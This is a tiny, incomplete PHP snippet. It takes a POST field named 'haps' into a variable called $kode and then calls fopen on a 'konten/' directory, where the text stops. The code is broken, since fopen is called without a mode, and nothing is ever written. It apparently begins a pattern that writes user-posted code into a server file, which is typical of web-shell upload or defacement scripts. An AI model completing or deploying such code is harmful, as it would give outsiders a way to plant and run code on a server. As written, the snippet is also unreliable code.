<?php 
$kode = $_POST['haps'];
$darkpeasant = fopen("konten/")
?>